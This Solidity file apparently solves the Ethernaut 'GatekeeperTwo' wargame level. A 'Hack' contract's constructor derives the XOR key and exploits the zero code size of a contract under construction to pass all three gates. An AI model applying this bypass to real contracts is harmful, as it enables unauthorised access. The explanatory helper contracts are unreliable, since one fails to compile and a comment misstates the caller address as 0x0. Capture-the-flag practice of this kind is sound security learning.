// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}


contract Hack {
    constructor() public {
        //Where yourAddress is the targeted address instance you get from Ethernaut
        GatekeeperTwo gate = GatekeeperTwo(yourAddress);
        uint64 gateKey = uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (uint64(0) - 1);
        gate.enter(bytes8(gateKey));
    }
}



//Here are 3 contracts to explain the assembly { x := extcodesize(caller()) } gate
contract OriginAddressTest {
    
    bool public legit = false;
    uint public test;
        
    function checkAddress() public {
        uint x;
        assembly { x := extcodesize(caller()) }
        test = x;
        if (x == 0){
            legit = true;
        }
    }
}


//will call checkAddress in OriginAddressTest while deploying so with an address = 0x0. and will pass the check
contract callAndCheck {
    
    constructor() public {
        OriginAddressTest originAddress = OriginAddressTest();
        originAddress.checkAddress();
    }
}

//will call checkAddress in OriginAddressTest AFTER being deployed and therefore from an address that != 0x0 and fail the check
contract callAndFail {
    OriginAddressTest originAddress = OriginAddressTest();
    
    function callAndChechAndFail() public {
        originAddress.checkAddress();
    }
}